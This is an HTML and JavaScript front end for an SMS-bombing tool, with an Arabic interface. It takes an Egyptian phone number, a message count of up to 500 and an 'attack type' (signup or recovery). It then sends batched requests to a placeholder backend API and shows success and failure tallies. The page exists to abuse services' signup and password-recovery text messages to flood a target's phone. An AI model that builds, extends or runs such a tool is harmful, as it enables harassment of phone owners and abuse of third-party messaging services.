<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Tool</title>
    <style>
        :root {
            --color-bg-base: #0f172a;
            --color-bg-elevated: #1e293b;
            --color-bg-surface: #334155;
            --color-text-primary: #f1f5f9;
            --color-text-secondary: #cbd5e1;
            --color-primary: #38bdf8;
            --color-primary-hover: #0ea5e9;
            --color-success: #10b981;
            --color-error: #ef4444;
            --color-warning: #f59e0b;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--color-bg-base);
            color: var(--color-text-primary);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 600px;
            background: var(--color-bg-elevated);
            border-radius: 16px;
            padding: 32px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }
        .header { text-align: center; margin-bottom: 32px; }
        .header h1 { font-size: 32px; color: var(--color-primary); margin-bottom: 8px; }
        .header p { color: var(--color-text-secondary); font-size: 14px; }
        .form-group { margin-bottom: 24px; }
        label {
            display: block;
            margin-bottom: 8px;
            color: var(--color-text-secondary);
            font-weight: 500;
            font-size: 14px;
        }
        input[type="text"], input[type="number"], select {
            width: 100%;
            padding: 12px 16px;
            background: var(--color-bg-surface);
            border: 2px solid transparent;
            border-radius: 8px;
            color: var(--color-text-primary);
            font-size: 16px;
            transition: all 0.3s ease;
        }
        input:focus, select:focus { outline: none; border-color: var(--color-primary); }
        select { cursor: pointer; }
        .btn {
            width: 100%;
            padding: 14px 24px;
            background: var(--color-primary);
            color: var(--color-bg-base);
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn:hover:not(:disabled) {
            background: var(--color-primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(56, 189, 248, 0.4);
        }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status {
            margin-top: 24px;
            padding: 16px;
            background: var(--color-bg-surface);
            border-radius: 8px;
            display: none;
        }
        .status.active { display: block; }
        .status-header { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid var(--color-bg-elevated);
            border-top-color: var(--color-primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-text { color: var(--color-text-secondary); font-size: 14px; }
        .progress-bar {
            width: 100%;
            height: 8px;
            background: var(--color-bg-elevated);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 16px;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--color-primary), var(--color-success));
            width: 0%;
            transition: width 0.3s ease;
        }
        .results { display: none; margin-top: 24px; padding: 24px; background: var(--color-bg-surface); border-radius: 12px; }
        .results.active { display: block; }
        .results h3 { color: var(--color-primary); margin-bottom: 20px; text-align: center; font-size: 20px; }
        .result-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            background: var(--color-bg-elevated);
            border-radius: 8px;
            margin-bottom: 12px;
        }
        .result-label { color: var(--color-text-secondary); font-size: 14px; }
        .result-value { font-size: 18px; font-weight: 600; }
        .result-value.success { color: var(--color-success); }
        .result-value.error { color: var(--color-error); }
        .result-value.warning { color: var(--color-warning); }
        .result-value.primary { color: var(--color-primary); }
        .percentage {
            display: inline-block;
            padding: 4px 12px;
            background: rgba(16, 185, 129, 0.2);
            color: var(--color-success);
            border-radius: 20px;
            font-size: 14px;
            margin-right: 8px;
        }
        .info-box {
            background: rgba(56, 189, 248, 0.1);
            border-right: 4px solid var(--color-primary);
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 24px;
        }
        .info-box p { color: var(--color-text-secondary); font-size: 13px; line-height: 1.6; }
        @media (max-width: 640px) {
            .container { padding: 24px; }
            .header h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 SMS Tool</h1>
            <p>أداة إرسال رسائل متعددة</p>
        </div>
        <div class="info-box">
            <p>📱 أدخل رقم الهاتف المصري وعدد الرسائل. الأداة ستقوم بإرسال الرسائل وعرض النتائج.</p>
        </div>
        <form id="smsForm">
            <div class="form-group">
                <label for="phone">📞 رقم الهاتف</label>
                <input type="text" id="phone" placeholder="01012345678" required>
            </div>
            <div class="form-group">
                <label for="count">📊 عدد الرسائل</label>
                <input type="number" id="count" min="1" max="500" value="10" required>
            </div>
            <div class="form-group">
                <label for="attackType">⚡ نوع الهجوم</label>
                <select id="attackType" required>
                    <option value="1">🟢 Signup</option>
                    <option value="2">🟡 Recovery</option>
                </select>
            </div>
            <button type="submit" class="btn" id="submitBtn">إرسال الرسائل</button>
        </form>
        <div class="status" id="status">
            <div class="status-header">
                <div class="spinner"></div>
                <div class="status-text" id="statusText">جاري الإرسال...</div>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>
        <div class="results" id="results">
            <h3>📊 النتائج</h3>
            <div class="result-item">
                <span class="result-label">📞 الرقم</span>
                <span class="result-value primary" id="resultPhone">-</span>
            </div>
            <div class="result-item">
                <span class="result-label">📨 المجموع</span>
                <span class="result-value" id="resultTotal">-</span>
            </div>
            <div class="result-item">
                <span class="result-label">✅ نجح</span>
                <span class="result-value success" id="resultSuccess">-</span>
            </div>
            <div class="result-item">
                <span class="result-label">❌ فشل (406)</span>
                <span class="result-value error" id="resultFail406">-</span>
            </div>
            <div class="result-item">
                <span class="result-label">⚠️ فشل (أخرى)</span>
                <span class="result-value warning" id="resultFailOther">-</span>
            </div>
        </div>
    </div>
    <script>
        const API_KEY = "your-secret-key-123456";
        const API_URL = "https://your-project.vercel.app/api/sms";

        function normalizePhone(phone) {
            phone = phone.trim();
            if (phone.startsWith('+')) return phone;
            if (phone.startsWith('0')) phone = phone.substring(1);
            return '+20' + phone;
        }

        async function sendRequest(attackType, phone) {
            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({ phone, attackType })
                });
                const data = await response.json();
                return data.result || 'other';
            } catch (error) {
                return 'other';
            }
        }

        async function runSMS(phone, count, attackType) {
            let success = 0, fail406 = 0, failOther = 0, done = 0;
            const progressFill = document.getElementById('progressFill');
            const statusText = document.getElementById('statusText');
            const RPS = 5, BATCH_DELAY = 3000;

            while (done < count) {
                const batchSize = Math.min(RPS, count - done);
                const promises = [];
                for (let i = 0; i < batchSize; i++) {
                    promises.push(sendRequest(attackType, phone));
                }
                const results = await Promise.all(promises);
                for (const result of results) {
                    if (result === 'ok') success++;
                    else if (result === '406') fail406++;
                    else failOther++;
                    done++;
                }
                const progress = (done / count) * 100;
                progressFill.style.width = progress + '%';
                statusText.textContent = `جاري الإرسال... ${done} / ${count}`;
                if (done < count) await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
            return { success, fail406, failOther, total: done };
        }

        document.getElementById('smsForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = normalizePhone(document.getElementById('phone').value);
            const count = parseInt(document.getElementById('count').value);
            const attackType = parseInt(document.getElementById('attackType').value);
            const submitBtn = document.getElementById('submitBtn');
            const status = document.getElementById('status');
            const results = document.getElementById('results');
            const progressFill = document.getElementById('progressFill');

            if (count < 1 || count > 500) {
                alert('العدد يجب أن يكون بين 1 و 500');
                return;
            }

            submitBtn.disabled = true;
            status.classList.add('active');
            results.classList.remove('active');
            progressFill.style.width = '0%';

            try {
                const result = await runSMS(phone, count, attackType);
                const percentage = result.total > 0 ? Math.round((result.success / result.total) * 100) : 0;
                document.getElementById('resultPhone').textContent = phone;
                document.getElementById('resultTotal').textContent = result.total;
                document.getElementById('resultSuccess').innerHTML = `<span class="percentage">${percentage}%</span>${result.success}`;
                document.getElementById('resultFail406').textContent = result.fail406;
                document.getElementById('resultFailOther').textContent = result.failOther;
                status.classList.remove('active');
                results.classList.add('active');
            } catch (error) {
                alert('حدث خطأ: ' + error.message);
            } finally {
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
